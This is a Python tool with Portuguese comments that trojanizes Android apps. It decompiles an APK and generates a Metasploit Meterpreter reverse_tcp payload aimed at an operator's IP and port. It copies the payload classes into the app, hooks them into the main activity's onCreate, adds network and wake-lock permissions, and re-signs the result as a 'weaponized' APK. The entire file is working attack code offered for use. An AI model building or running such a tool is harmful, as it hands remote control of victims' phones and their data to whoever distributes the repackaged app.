import subprocess
import re
import os
import sys
import time
from shutil import which, copytree, rmtree

# --- CORES E ESTILO ---
RED, DARK_RED, WHITE, BOLD, RESET, YELLOW, GREEN = "\33[91m", "\33[31m", "\33[97m", "\33[1m", "\33[0m", "\33[93m", "\33[92m"

def log(msg, level="info"):
    p = {"info": f"{WHITE}[*]{RESET}", "success": f"{GREEN}[+]{RESET}", "warn": f"{YELLOW}[!]{RESET}", "error": f"{BOLD}{RED}[-]{RESET}"}
    print(f"{p.get(level, '[*]')} {msg}")

def exibir_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = fr"""
{RED} ██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗ 
{RED} ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║╚══███╔╝██╔════╝██╔══██╗
{DARK_RED} ██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║██║  ███╔╝ █████╗  ██████╔╝
{DARK_RED} ██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║ ███╔╝  ██╔══╝  ██╔══██╗
{RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
{RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
 {WHITE}{BOLD}WEAPONIZER@AUTOBOT{RESET} | {WHITE}Automated Shell Injection v5.0{RESET}
 {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
    """.strip()
    print(banner)

def fix_permissions(project_folder):
    """Garante que as permissões de rede existam no Manifesto."""
    manifest = os.path.join(project_folder, "AndroidManifest.xml")
    log("Auditando permissões no AndroidManifest.xml...", "info")
    
    with open(manifest, "r") as f: content = f.read()
    
    perms = [
        'android.permission.INTERNET',
        'android.permission.ACCESS_NETWORK_STATE',
        'android.permission.WAKE_LOCK'
    ]
    
    needed = []
    for p in perms:
        if p not in content: needed.append(f'    <uses-permission android:name="{p}"/>')
    
    if needed:
        new_content = content.replace("</manifest>", "\n".join(needed) + "\n</manifest>")
        with open(manifest, "w") as f: f.write(new_content)
        log(f"Permissões injetadas: {len(needed)} adicionadas.", "success")
    else:
        log("Todas as permissões necessárias já estão presentes.", "success")

def gerar_e_injetar_payload(project_folder):
    lhost = input(f" {YELLOW}»{RESET} Seu IP (LHOST): ").strip()
    lport = input(f" {YELLOW}»{RESET} Sua Porta (LPORT): ").strip()
    
    if not lhost or not lport:
        log("IP/Porta inválidos!", "error"); return False

    # 1. Gerar Payload Temporário com MSFVENOM
    log("Iniciando motor msfvenom para gerar classes do Meterpreter...", "info")
    subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", "payload_tmp.apk"], capture_output=True)
    
    if not os.path.exists("payload_tmp.apk"):
        log("msfvenom falhou. Certifique-se que o Metasploit está instalado.", "error"); return False

    # 2. Extrair arquivos do Payload
    log("Extraindo classes maliciosas...", "info")
    subprocess.run(["apktool", "d", "payload_tmp.apk", "-o", "payload_tmp", "-f"], capture_output=True)
    
    # 3. Copiar pastas do Metasploit para o Alvo
    src_smali = os.path.join("payload_tmp", "smali", "com", "metasploit")
    dst_smali = os.path.join(project_folder, "smali", "com", "metasploit")
    
    if os.path.exists(dst_smali): rmtree(dst_smali)
    os.makedirs(os.path.dirname(dst_smali), exist_ok=True)
    copytree(src_smali, dst_smali)
    log("Classes do Meterpreter migradas para o projeto alvo.", "success")

    # 4. Injetar o HOOK no Smali automaticamente
    log("Realizando 'Cirurgia Smali' na MainActivity...", "info")
    with open(os.path.join(project_folder, "AndroidManifest.xml"), "r") as f:
        m_content = f.read()
        main_activity = re.search(r'<activity [^>]*android:name="([^"]+)"', m_content).group(1)
    
    smali_path = None
    target_file = main_activity.replace('.', '/') + ".smali"
    for root, dirs, files in os.walk(project_folder):
        if target_file in os.path.join(root, target_file) and os.path.exists(os.path.join(root, target_file)):
            smali_path = os.path.join(root, target_file); break

    if smali_path:
        with open(smali_path, "r") as f: lines = f.readlines()
        new_lines, injected = [], False
        hook = "    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n"
        
        for line in lines:
            new_lines.append(line)
            if "onCreate(Landroid/os/Bundle;)V" in line: in_proc = True
            if "invoke-super" in line and not injected:
                new_lines.append(f"\n    # --- WEAPONIZER AUTO-START ---\n{hook}    # --- END ---\n\n")
                injected = True
        
        with open(smali_path, "w") as f: f.writelines(new_lines)
        log("Hook de execução injetado com sucesso!", "success")
        
        # 5. Fix Permissions
        fix_permissions(project_folder)
        
        # Limpeza
        rmtree("payload_tmp"); os.remove("payload_tmp.apk")
        return True
    return False

def build_e_assinar(out):
    final_apk = f"{out}_weaponized.apk"
    log(f"Recompilando e Otimizando: {out}...", "info")
    subprocess.run(["apktool", "b", out, "-o", "tmp.apk"], capture_output=True)
    
    ks = "debug.keystore"
    if not os.path.exists(ks):
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", ks, "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=Weaponizer"], capture_output=True)
    
    subprocess.run(["apksigner", "sign", "--ks", ks, "--ks-pass", "pass:android", "--out", final_apk, "tmp.apk"])
    if os.path.exists("tmp.apk"): os.remove("tmp.apk")
    log(f"PROCESSO COMPLETO: {BOLD}{final_apk}{RESET}", "success")
    input("\nPressione Enter para voltar ao menu...")

def main():
    while True:
        exibir_banner()
        print(f" [{RED}1{RESET}] Decompile (Abrir APK)")
        print(f" [{RED}2{RESET}] INJETAR SHELL REVERSO (Automático)")
        print(f" [{RED}3{RESET}] Listar Arquivos (ls)")
        print(f" [{RED}4{RESET}] Sair")
        
        cmd = input(f"\n {BOLD}{RED}WEAPONIZER@robotic:~# {RESET}").strip()
        
        if cmd == "3" or cmd.lower() == "ls":
            print(f"\n{BOLD}Diretório Atual:{RESET}")
            subprocess.run(["ls", "-F", "--color=auto"])
            input("\nEnter para voltar...")
        elif cmd == "1":
            file = input(f" {RED}»{RESET} Caminho do APK: ").strip()
            if os.path.exists(file):
                out = os.path.splitext(os.path.basename(file))[0]
                subprocess.run(["apktool", "d", file, "-o", out, "-f"])
                log(f"Pasta de trabalho: {out}", "success"); time.sleep(1)
            else: log("Arquivo não encontrado.", "error"); time.sleep(1)
        elif cmd == "2":
            out = input(f" {RED}»{RESET} Pasta do projeto: ").strip().rstrip('/')
            if os.path.isdir(out):
                if gerar_e_injetar_payload(out):
                    build_e_assinar(out)
            else: log("Pasta não encontrada.", "error"); time.sleep(1)
        elif cmd == "4" or cmd.lower() == "exit": break
        elif cmd.lower() == "clear": continue
        else:
            if cmd != "": log(f"Comando '{cmd}' inválido.", "error"); time.sleep(1)

if __name__ == "__main__":
    main()
